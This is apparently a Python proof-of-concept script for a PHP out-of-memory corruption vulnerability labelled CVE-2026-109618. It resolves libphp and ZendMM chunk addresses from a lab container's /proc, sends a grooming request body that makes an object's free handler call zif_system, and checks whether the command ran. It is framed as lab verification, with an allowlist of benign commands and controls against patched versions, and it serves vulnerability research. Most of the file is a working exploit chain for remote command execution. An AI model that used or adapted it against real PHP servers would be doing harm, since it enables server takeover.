#!/usr/bin/env python3
"""CVE-2026-109618 OOM-corruption terminal call — lab-assisted proof.

Reproduces the public OOM chain (urlencoded `a[<large-key>][c]=v` + pad
grooming) but replaces the libc ROP with `free_obj = zif_system`, so only
libphp + the ZendMM chunk base are needed. Both are read from the target
container's `/proc` (LAB-ASSISTED — this is not the remote in-band leak;
see docs/ANALYSIS.md §0.11).

Controls:
  - fixed benign command (`id | uname | whoami`);
  - patched 8.4.27 must block (the OOM rework removes the unwritten bucket);
  - `--bias-zif` shifts the terminal address (must stop firing).

Usage:
  (cd lab-pure-modphp && docker compose up -d pure-arm64)
  python3 poc/verify_109618_zif.py \
      --target 127.0.0.1:18130 --container php2shell-pure-arm64 \
      --cmd id --offset 0x5e400

The target container needs the low-limit 109618 profile (memory_limit=8M,
post_max_size>=1G, single prefork worker). The proof file is written inside
the container (`/tmp/p109618proof` by default).
"""

import argparse
import os
import re
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from php2shell import cve109618, probe
from php2shell.guard import ALLOWED_CMDS, check_cmd

MARKERS = {"id": b"uid=", "uname": b"Linux", "whoami": b"www-data"}


def sh(container, cmd):
    return subprocess.run(["docker", "exec", container, "sh", "-c", cmd],
                          capture_output=True, text=True)


def worker_pid(container):
    r = sh(container, "ps -o pid= -C apache2 | sort -n | tail -1")
    pid = r.stdout.strip()
    if not pid:
        r = sh(container, "pgrep -n apache2")
        pid = r.stdout.strip()
    return int(pid) if pid.isdigit() else None


def find_libphp(container, pid):
    r = sh(container, f"cat /proc/{pid}/maps")
    for line in r.stdout.splitlines():
        p = line.split()
        if len(p) >= 6 and p[1] == "r-xp" and p[5].endswith("/libphp.so"):
            return int(p[0].split("-")[0], 16)
    return None


def _read24(container, pid, addr):
    r = sh(container, f"dd if=/proc/{pid}/mem bs=1 skip={addr} count=24 "
                      f"2>/dev/null | od -An -tx8")
    vals = re.findall(r"[0-9a-fA-F]{8,16}", r.stdout)
    if len(vals) < 3:
        return None
    return [int(v, 16) for v in vals[:3]]


def find_chunk(container, pid):
    r = sh(container, f"cat /proc/{pid}/maps")
    for line in r.stdout.splitlines():
        p = line.split()
        if len(p) < 2 or p[1] != "rw-p":
            continue
        if len(p) >= 6 and p[5] != "":
            continue
        a, b = p[0].split("-")
        start, end = int(a, 16), int(b, 16)
        if start % 0x200000 or end - start < 0x200000:
            continue
        q = _read24(container, pid, start)
        if q and q[0] == start + 0x40 and q[1] == start and q[2] == start:
            return start
    return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:18130")
    ap.add_argument("--container", required=True,
                    help="lab container name (for /proc address sourcing)")
    ap.add_argument("--cmd", default="id", choices=ALLOWED_CMDS)
    ap.add_argument("--offset", type=lambda x: int(x, 0), default=0x5E400,
                    help="B offset inside the ZendMM chunk (ASLR-on 8M: "
                         "0x5e400 standalone; 0x67e00 after a 128M 9bie leak)")
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--proof", default="/tmp/p109618proof")
    ap.add_argument("--arch", choices=["aarch64", "x86_64"], default="aarch64")
    ap.add_argument("--bias-zif", type=lambda x: int(x, 0), default=0,
                    help="load-bearing control: shift zif_system (must fail)")
    args = ap.parse_args()

    scheme, host, port = probe.parse_target(args.target)
    if scheme != "http":
        sys.exit("lab targets are plain HTTP")
    cmd = check_cmd(args.cmd)

    pid = worker_pid(args.container)
    if not pid:
        sys.exit(f"[!] no apache2 worker in {args.container}")
    libphp = find_libphp(args.container, pid)
    chunk = find_chunk(args.container, pid)
    if not libphp or not chunk:
        sys.exit(f"[!] could not resolve bases (libphp={libphp}, chunk={chunk})")

    print("[*] CVE-2026-109618 OOM chain (zif_system terminal, lab-assisted)")
    print(f"    target: {host}:{port}{args.path}  container: {args.container}")
    print(f"    libphp: {libphp:#x}  chunk: {chunk:#x}  B offset: {args.offset:#x}")
    print(f"    cmd: {cmd!r}  proof: {args.proof}")
    print()

    sh(args.container, f"rm -f {args.proof}")
    # a bias on the base shifts every zif_system reference (load-bearing control)
    body, zif = cve109618.build_body(
        libphp + args.bias_zif, chunk, f"{cmd}>{args.proof}",
        b_off=args.offset, arch=args.arch,
    )
    resp = cve109618.send(host, port, body, path=args.path)
    print(f"    response: {probe.status(resp)}  body={len(probe.body(resp))} B")
    proof = sh(args.container, f"cat {args.proof} 2>/dev/null").stdout.strip()
    print()

    if proof and MARKERS[cmd] in proof.encode("latin-1"):
        print("[EVIDENCE] CVE-2026-109618 TERMINAL CALL REPRODUCED")
        print(f"    zif_system: {zif:#x}  (B={chunk + args.offset:#x})")
        print(f"    output: {proof}")
        print("    - OOM left an unwritten bucket; shutdown walked it;")
        print("      free_obj = zif_system ran the fixed command.")
        print("    - ASLR on; no libc ROP, no gdb at fire time.")
        print("    - Lab-assisted: addresses came from /proc, not an in-band leak.")
        return 0
    if args.bias_zif:
        print("[EVIDENCE] bias control held: shifted zif_system did not fire.")
        return 0
    print("[!] no proof. Check the 8M profile, single worker, and --offset")
    print("    (0x5e400 fresh; 0x67e00 after a 128M leak sequence).")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
